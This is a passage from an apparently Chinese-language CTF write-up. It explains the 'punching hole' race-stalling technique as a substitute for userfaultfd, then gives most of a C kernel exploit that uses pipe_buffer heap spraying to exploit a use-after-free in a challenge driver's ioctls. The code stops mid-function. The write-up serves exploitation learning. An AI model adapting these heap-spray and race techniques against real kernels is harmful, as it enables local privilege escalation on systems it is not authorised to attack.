hole</code>。这个打法笔者是第一次听，网上也找不到什么资料，最后也是请教 Csome 师兄和 cnitlrt 师傅。大致意思就是把线程丢到一个等待队列，令一个线程休眠，其触发条件和 <code>userfaultfd</code> 一样也是通过 <code>copy</code> 类函数触发。将 <code>userfaultfd</code> 改用 <code>punching hole</code> 后其余操作和上面那个 <code>exp</code> 一致，不过由于使用了 <code>punching hole</code> 后堆的布局有了点变化，所以我 <code>pipe_buffer</code> 在堆块 <code>uaf</code> 的前面和后面各喷了一次以来提高命中率。</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// musl-gcc exp.c --static -masm=intel -lpthread -idirafter /usr/include/ -idirafter /usr/include/x86_64-linux-gnu/ -o exp</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> *msg;</span><br><span class="line">    <span class="type">uint64_t</span> a;</span><br><span class="line">    <span class="type">uint64_t</span> b;</span><br><span class="line">    <span class="type">uint64_t</span> c;</span><br><span class="line">    <span class="type">uint64_t</span> d;</span><br><span class="line">    <span class="type">uint64_t</span> e;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">vuln</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_PIPE_COUNT 0x50</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_SECONDARY_PIPE_COUNT 0x150</span></span><br><span class="line"><span class="type">int</span> pipe_fd[MAX_PIPE_COUNT][<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> already_read[MAX_PIPE_COUNT];</span><br><span class="line"><span class="type">int</span> snd_pipe_fd[MAX_SECONDARY_PIPE_COUNT][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spray_pipes</span><span class="params">(<span class="type">int</span> start, <span class="type">int</span> cnt)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *buf[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] enter %s start from index: %d\n&quot;</span>, __PRETTY_FUNCTION__, start);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = start; i &lt; cnt; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;create pipe&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spray_pipes2</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> *buf[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] enter %s\n&quot;</span>, __PRETTY_FUNCTION__);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_SECONDARY_PIPE_COUNT; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(snd_pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;create pipe&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (fcntl(snd_pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;resize pipe&quot;</span>);    </span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span>&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pushf;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop user_rflags;&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">char</span> v14[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin add.&quot;</span>);</span><br><span class="line">    vuln.e = (<span class="type">size_t</span>)v14;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF0</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Add success.&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin delete&quot;</span>);</span><br><span class="line">    vuln.e = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF1</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Delete success.&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> shm_id;</span><br><span class="line"><span class="comment">// SYNC</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sync_s</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> x1;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> x2;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> x3;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> x4;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sync_s</span> *<span class="title">sync_s</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMAP_ADDR ((void *)0xdead0000)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TARGET_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TARGET_PAGES (TARGET_SIZE / 0x8 - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// PUNCHING HOLE</span></span><br><span class="line"><span class="type">int</span> mfd;</span><br><span class="line"><span class="type">size_t</span> shmem_sz = (<span class="number">0x1000</span> * <span class="number">0xa</span>) * PAGE_SIZE;</span><br><span class="line"><span class="type">int</span> <span class="title function_">punch_hole_prepare</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    mfd = memfd_create(<span class="string">&quot;x&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mfd == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;memfd_create failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *addr = mmap(MMAP_ADDR, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, mfd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (addr != MMAP_ADDR) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;mmap failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ret = fallocate(mfd, <span class="number">0</span>, <span class="number">0</span>, shmem_sz);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ret == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;fallocate failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;fallocate success&quot;</span>);</span><br><span class="line">    <span class="type">void</span> *addr2 = mmap(MMAP_ADDR + PAGE_SIZE, PAGE_SIZE * TARGET_PAGES, PROT_READ | PROT_WRITE,</span><br><span class="line">                       MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (addr2 != MMAP_ADDR + PAGE_SIZE) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;mmap failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">trigger_punch_hole</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> tmp;</span><br><span class="line">    <span class="keyword">while</span> (!sync_s-&gt;x1)</span><br><span class="line">        ;</span><br><span class="line">    info(<span class="string">&quot;trigger_punch_hole&quot;</span>);</span><br><span class="line">    sync_s-&gt;x2 = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> ret = fallocate(mfd, FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE, <span class="number">0</span>, shmem_sz);</span><br><span class="line">    <span class="keyword">if</span>(ret &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;fallocate&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete_fd</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (!sync_s-&gt;x3)</span><br><span class="line">        ;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] trigger uaf\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    spray_pipes(<span class="number">0x10</span>, MAX_PIPE_COUNT);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0x10</span>; i &lt; MAX_PIPE_COUNT; ++i) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> k = i;</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;writesth&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;Qanux&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;Qanux&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    del();</span><br><span class="line"></span><br><span class="line">    spray_pipes(<span class="number">0</span>, <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; ++i) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> k = i;</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;writesth&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;Qanux&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;Qanux&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">triger_vuln</span><span class="params">()</span>&#123;</span><br><span class="line">    sync_s-&gt;x1 = <span class="number">1</span>;</span><br><span class="line">    add();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!(sync_s-&gt;x2))</span><br><span class="line">        ;</span><br><span class="line">    info(<span class="string">&quot;triger_vuln&quot;</span>);</span><br><span class="line">    sync_s-&gt;x3 = <span class="number">1</span>;</span><br><span class="line">    